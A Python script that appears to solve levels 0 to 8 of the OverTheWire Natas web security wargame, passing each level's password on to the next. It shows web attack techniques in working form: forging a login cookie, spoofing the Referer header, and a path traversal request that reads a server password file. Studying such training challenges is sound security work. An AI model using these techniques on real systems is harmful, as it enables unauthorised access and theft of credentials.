import requests
import base64
import re
def natas0(chall, username, password):
    url = f"http://natas{chall}.natas.labs.overthewire.org"
    r = requests.get(url, auth=(username, password))
    pw = re.findall(r"is (\S*(?:\s\S+)?) ", r.text)[1]
    print("Found Password For Natas1:", pw)
    return pw

def natas1(chall, username):
    password = natas0(0, "natas0", "natas0")
    url = f"http://natas{chall}.natas.labs.overthewire.org"
    r = requests.get(url, auth=(username, password))
    pw = re.findall(r"is (\S*(?:\s\S+)?) ", r.text)[2]
    print("Found Password For Natas2:", pw)
    return pw

def natas2(chall, username):
    password = natas1(1, "natas1")
    url = f"http://natas{chall}.natas.labs.overthewire.org/files/users.txt"
    r = requests.get(url, auth=(username, password))
    pw = re.findall(r"(?<=natas3:).*", r.text)[0]
    print("Found Password For Natas3:", pw)
    return pw

def natas3(chall, username):
    password = natas2(2, "natas2")
    url = f"http://natas{chall}.natas.labs.overthewire.org/s3cr3t/users.txt"
    r = requests.get(url, auth=(username, password))
    pw = re.findall(r"(?<=natas4:).*", r.text)[0]
    print("Found Password For Natas4:", pw)
    return pw

def natas4(chall, username):
    password = natas3(3, "natas3")
    url = f"http://natas{chall}.natas.labs.overthewire.org"
    headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
    r = requests.get(url, auth=(username, password), headers=headers)
    pw = re.findall(r"(?<=is ).*", r.text)[1]
    print("Found Password For Natas5:", pw)
    return pw


def natas5(chall, username):
    password = natas4(4, "natas4")
    url = f"http://natas{chall}.natas.labs.overthewire.org"
    cookies = {"loggedin": "1"}
    r = requests.get(url, auth=(username, password), cookies=cookies)
    pw = re.findall(r"(?<=is )(.*)<\/div>", r.text)[0]
    print("Found Password For Natas6:", pw)
    return pw


def natas6(chall, username):
    password = natas5(5, "natas5")
    url = f"http://natas{chall}.natas.labs.overthewire.org/index.php"
    values = {'secret': 'FOEIUWGHFEEUHOFUOIU',
            'submit': 'Submit Query'}
    r = requests.post(url, auth=(username, password), data=values)
    pw = re.findall(r"(?<=is ).*", r.text)[1]
    print("Found Password For Natas7:", pw)
    return pw

    
def natas7(chall, username):
    password = natas6(6, "natas6")
    url = f"http://natas{chall}.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8"
    r = requests.get(url, auth=(username, password))
    pw = re.findall(r"(?<=<br>\n).*", r.text)[1]
    print("Found Password For Natas8:", pw)
    return pw

def natas8(chall, username):
    password = natas7(7, "natas7")
    secreturl = f"http://natas{chall}.natas.labs.overthewire.org/index-source.html"
    url = f"http://natas{chall}.natas.labs.overthewire.org/index.php"
    r = requests.get(secreturl, auth=(username, password))
    encsecret = re.findall(r'<\s*span[^>]*>"(.*?)"<\s*\/\s*span>', r.text)[0]
    secret = base64.b64decode((bytes.fromhex(encsecret).decode("ASCII"))[::-1]).decode("ASCII")
    values = {'secret': secret,
            'submit': 'Submit Query'}
    r = requests.post(url, auth=(username, password), data=values)
    pw = re.findall(r"(?<=is ).*", r.text)[1]
    print("Found Password For Natas9:", pw)
    return pw


natas8(8, "natas8")